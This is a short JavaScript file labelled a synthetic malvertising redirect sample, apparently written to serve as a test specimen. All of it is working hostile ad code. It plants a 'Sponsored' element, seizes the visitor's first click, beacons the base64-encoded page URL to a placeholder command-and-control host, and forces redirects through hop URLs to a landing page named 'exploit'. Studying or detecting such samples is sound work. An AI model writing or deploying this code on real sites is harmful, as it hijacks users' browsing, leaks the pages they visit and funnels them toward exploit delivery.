// ADREDIR — synthetic malvertising redirect product sample.
(function () {
  var C2 = 'https://c2.example.test/adredir';
  var hops = ['https://hop1.example.test/r', 'https://hop2.example.test/r', 'https://landing.example.test/exploit'];
  var clicked = false;
  console.log('[ADREDIR] creative armed');

  function report(stage) {
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ stage: stage, href: location.href })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('adredir:stage', stage); } catch (error) {}
  }

  document.addEventListener('click', function () {
    if (clicked) return;
    clicked = true;
    report('click');
    try { location.assign(hops[0] + '?u=' + encodeURIComponent(location.href)); } catch (error) {}
    setTimeout(function () {
      try { location.replace(hops[2]); } catch (error) {}
    }, 500);
  }, true);

  try {
    var creative = document.createElement('div');
    creative.id = 'adredir-creative';
    creative.textContent = 'Sponsored';
    document.body.appendChild(creative);
  } catch (error) {}

  setTimeout(function () {
    report('impression');
    console.log('[ADREDIR] impression');
  }, 250);
})();
